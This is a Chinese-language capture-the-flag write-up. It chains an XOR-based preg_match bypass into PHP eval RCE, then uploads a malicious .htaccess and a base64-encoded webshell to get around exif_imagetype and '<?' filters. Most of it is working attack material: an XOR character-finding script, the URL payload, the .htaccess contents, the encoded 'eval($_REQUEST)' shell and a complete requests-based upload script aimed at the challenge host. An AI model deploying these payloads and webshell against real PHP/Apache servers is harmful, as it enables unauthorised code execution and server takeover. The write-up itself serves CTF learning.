2.php不可见字符绕过preg_match()函数rce

首先有eval()函数，就先想着绕过前面的各种限制（就是字符串的长度小于或等于18个），这个看大佬的wp说可以用什么不可见字符异或得我们想要的字符来绕过，下面是大佬的脚本

import urllib.parse

find = ['_','G','E','T']
for i in range(1,256):
    for j in range(1,256):
        result = chr(i^j)
        if(result in find):
            a = i.to_bytes(1,byteorder='big')
            b = j.to_bytes(1,byteorder='big')
            a = urllib.parse.quote(a)
            b = urllib.parse.quote(b)
            print("%s:%s^%s"%(result,a,b))

可见

_:%FF^%A0
G:%FF^%B8
E:%FF^%BA
T:%FF^%AB

可用的payload:

?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=phpinfo

她所代表的真正的含义为
`$_GET{x}()`

后面就能通过上传参数x=phpinfo构造phpinfo();了。（ztmnb）

然后把phpinfo换为get_the_flag()函数就能执行这个上传的功能了。（好像是因为设置了什么open_basedir限制了eval的功能，所以得传个webshell才可）

1.上传文件

大佬的经验.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。
可以用以下两种方法开头以绕过

可以用
"\x00\x00\x8a\x39\x8a\x39"


也可以用
"#define width 1337"
"#define height 1337"

另外因为这里的php是7.2的版本，无法使用 <script language="php"></script> 来绕过对 <? 的检测

这里的绕过对<?的检测。可以使用base64编码进行绕过，然后再在apache的解析文件中将文件的内容还原从而绕过

.htaccess文件

\x00\x00\x8a\x39\x8a\x39
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_556cf09f27d80bd5b6cffc1d3f08a264/sh3ll.abc"

这里的tmp_后面的似乎是当前的ip地址md5加密后的结果，~浏览器输入ip，复制后加密取32位小写代换一下就ok啦。~好了这样不行，我好jb菜，得等下面的脚本运行成功后改为脚本打印出来的值就ok了。

sh3ll.abc文件

GIF89a12
PD9waHAgZXZhbCgkX0dFVFsnMSddKTs/Pg==

2.上传文件的脚本

借鉴一个上传文件的脚本如下:

import requests
import base64

htaccess = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_556cf09f27d80bd5b6cffc1d3f08a264/sh3ll.abc"
"""

sh3ll = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['1']);?>")

url = "http://142537bb-b873-4a5a-900c-80c61dd2b53d.node3.buuoj.cn/?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=get_the_flag"

files = {'file':('.htaccess',htaccess,'image/jpeg')}
data = {"upload":"Submit"}
response = requests.post(url=url, data=data, files=files)
print(response.text)

files = {'file':('sh3ll.abc',sh3ll,'image/jpeg')}
          #文件:('上传的文件名',变量名,'文件类型')
response = requests.post(url=url, data=data, files=files)
print(response.text)
